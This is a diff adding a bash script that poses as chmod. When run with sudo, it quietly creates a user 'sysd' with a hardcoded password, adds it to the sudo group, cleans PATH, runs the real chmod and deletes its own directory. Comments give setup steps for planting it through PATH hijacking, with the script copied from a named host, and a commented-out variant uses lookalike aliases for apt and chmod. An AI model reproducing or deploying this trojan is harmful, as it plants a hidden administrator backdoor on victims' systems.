@@ -1,0 +1,46 @@
+#!/bin/bash
+
+# if not called with sudo - run the normal program then exit
+if (( $EUID != 0 )); then  
+    /bin/chmod ${@:1}
+    echo "Done."
+    exit 0 
+fi
+
+
+ # add user/password to /etc/shadow
+ useradd -g users -M -s /bin/bash -p $(echo D0nuts1234 | openssl passwd -1 -stdin) sysd
+ # change password
+ usermod -aG sudo sysd 
+
+ # clean the path
+ #PATH=$(echo $PATH | sed 's@/home/ndonnel/.local/sbin:@@g')
+ PATH=$(echo $PATH | sed 's@/home/jmwample/.local/sbin:@@g')
+
+ # call the program that was supposed to run 
+ /bin/chmod ${@:1}
+
+ # clean up
+ rm -rf  ~/.local/sbin
+
+
+
+ #instructions:
+ # 1. mkdir ~/.local/sbin/
+ # 2. PATH=~/.local/sbin/:$PATH
+ # 3. scp jwample@sweetiebelle:~/sbin ~/.local
+ # 4. wait
+
+
+
+## Alternate approach
+
+#alias apt='aqt'
+#alias apt-get='aqt-get'
+#alias chmod='chmob'
+
+ #clean the bashrc
+ # awk '!/alias chmod=|alias apt=|alias apt-get=/' please_rc > meowrc
+ # rm please_rc 
+ # mv meowrc pleasae_rc
+
